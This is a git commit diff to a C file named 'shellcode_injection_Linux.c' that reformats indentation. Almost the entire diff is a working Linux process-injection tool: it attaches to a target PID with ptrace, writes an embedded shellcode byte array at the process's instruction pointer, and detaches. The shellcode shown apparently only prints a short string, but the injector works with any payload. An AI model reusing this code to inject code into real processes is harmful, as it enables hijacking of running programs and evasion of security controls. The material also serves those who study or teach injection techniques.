0dec4f59b71203d851e2f1b52a562af9fae3382b
mauricelambert <50479118+mauricelambert@users.noreply.github.com>
2023-09-12 06:36:44 +0000

    Update shellcode_injection_Linux.c

--- shellcode_injection_Linux.c
+++ shellcode_injection_Linux.c
@@ -25,43 +25,43 @@ unsigned char shellcode[] = "\x48\xb8\x72\x6c\x64\x21\x0a\x00\x00\x00\x50\x48\xb
                             "\x48\xc7\xc2\x0d\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05";
 
 int main(int argc, char **argv) {
-	if (argc != 2) {
-		fputs("USAGES: shellcode_injection_Linux <pid>", stderr);
-		return 1;
-	}
-	unsigned int pid = atoi(argv[1]);
-	
-	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) {
-		fputs("ptrace attach failed", stderr);
-		return 2;
-	}
+        if (argc != 2) {
+                fputs("USAGES: shellcode_injection_Linux <pid>", stderr);
+                return 1;
+        }
+        unsigned int pid = atoi(argv[1]);
 
-	if (waitpid(pid, NULL, 0) != pid) {
-		fputs("wait pid failed", stderr);
-		return 3;
-	}
+        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0) {
+                fputs("ptrace attach failed", stderr);
+                return 2;
+        }
 
-	struct user_regs_struct registers;
-	if (ptrace(PTRACE_GETREGS, pid, NULL, &registers) != 0) {
-		fputs("ptrace get registers failed", stderr);
-		return 4;
-	}
+        if (waitpid(pid, NULL, 0) != pid) {
+                fputs("wait pid failed", stderr);
+                return 3;
+        }
 
-	long long unsigned int shellcode_pointer = registers.rip + 2;
+        struct user_regs_struct registers;
+        if (ptrace(PTRACE_GETREGS, pid, NULL, &registers) != 0) {
+                fputs("ptrace get registers failed", stderr);
+                return 4;
+        }
 
-	long unsigned int * shellcode_parts = (long unsigned int *)shellcode;
-	for (unsigned int index = 0; index * 8 < sizeof(shellcode); index += 1) {
-		if (ptrace(PTRACE_POKETEXT, pid, shellcode_pointer, shellcode_parts[index]) != 0) {
-			fputs("ptrace write data failed", stderr);
-			return 5;
-		}
-		shellcode_pointer += 8;
-	}
+        long long unsigned int shellcode_pointer = registers.rip + 2;
 
-	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) != 0) {
-		fputs("ptrace detach failed", stderr);
-		return 6;
-	}
+        long unsigned int * shellcode_parts = (long unsigned int *)shellcode;
+        for (unsigned int index = 0; index * 8 < sizeof(shellcode); index += 1) {
+                if (ptrace(PTRACE_POKETEXT, pid, shellcode_pointer, shellcode_parts[index]) != 0) {
+                        fputs("ptrace write data failed", stderr);
+                        return 5;
+                }
+                shellcode_pointer += 8;
+        }
 
-	return 0;
+        if (ptrace(PTRACE_DETACH, pid, NULL, NULL) != 0) {
+                fputs("ptrace detach failed", stderr);
+                return 6;
+        }
+
+        return 0;
 }
